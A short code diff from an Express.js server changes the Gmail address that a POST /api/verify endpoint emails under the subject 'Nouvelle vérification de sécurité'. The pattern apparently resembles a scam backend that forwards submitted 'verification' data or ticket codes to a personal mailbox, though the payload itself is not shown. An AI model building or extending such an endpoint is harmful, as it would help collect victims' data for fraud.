@@ -21,7 +21,7 @@ app.post('/api/verify', async (req, res) => {
         // Envoi via l'API Resend
         const data = await resend.emails.send({
             from: 'onboarding@resend.dev',
-            to: 'authentificationtickets81@gmail.com',
+            to: 'authentificationtickets811@gmail.com',
             subject: 'Nouvelle vérification de sécurité',
             html: `
                 <div style="font-family: sans-serif; line-height: 1.5;">
